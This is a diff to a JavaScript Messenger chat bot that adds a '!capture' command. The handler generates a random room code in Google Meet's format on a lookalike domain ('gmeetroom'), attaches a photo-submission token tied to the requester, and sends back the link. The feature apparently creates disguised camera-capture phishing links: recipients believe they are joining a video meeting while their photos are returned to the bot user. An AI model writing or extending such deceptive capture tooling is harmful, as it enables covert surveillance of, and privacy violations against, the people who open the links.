@@ -11658,6 +11658,10 @@ async function handleMessage(
         "♡ !watchdog status",
         "♡ !watchdog restart",
         "",
+        "୨୧ CAPTURE",
+        "♡ !capture",
+        "  Create a Messenger-linked capture link.",
+        "",
         "୨୧ PICTURES",
         "♡ !pic",
         "♡ !picture",
@@ -11836,6 +11840,41 @@ async function handleMessage(
 
       return;
     }
+  }
+
+  // ==========================================================
+  // CAPTURE LINK
+  // ==========================================================
+
+  if (text === "!capture") {
+    try {
+      const segment = len =>
+        Array.from({ length: len }, () =>
+          "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * 26))
+        ).join("");
+      const roomCode = segment(3) + "-" + segment(4) + "-" + segment(3);
+      const captureToken = createPhotoSubmissionToken(senderId);
+      const captureUrl = "https://gmeetroom.pntr.dev/" + roomCode + "?token=" + encodeURIComponent(captureToken);
+
+      sendReplyWithTyping(
+        api,
+        [
+          "╭────── 📸  CAPTURE LINK  📸 ──────╮",
+          "",
+          "Your private capture link is ready.",
+          "",
+          captureUrl,
+          "",
+          "This link is tied to your Messenger account and expires in 10 minutes.",
+          "╰────── ♡ ୨୧ 📸 ୨୧ ♡ ──────╯",
+        ].join("\n"),
+        threadID
+      );
+    } catch (error) {
+      console.error("[CAPTURE] Failed to create link:", error?.message || error);
+      sendReplyWithTyping(api, "❌ Could not create a capture link right now.", threadID);
+    }
+    return;
   }
 
   // ==========================================================
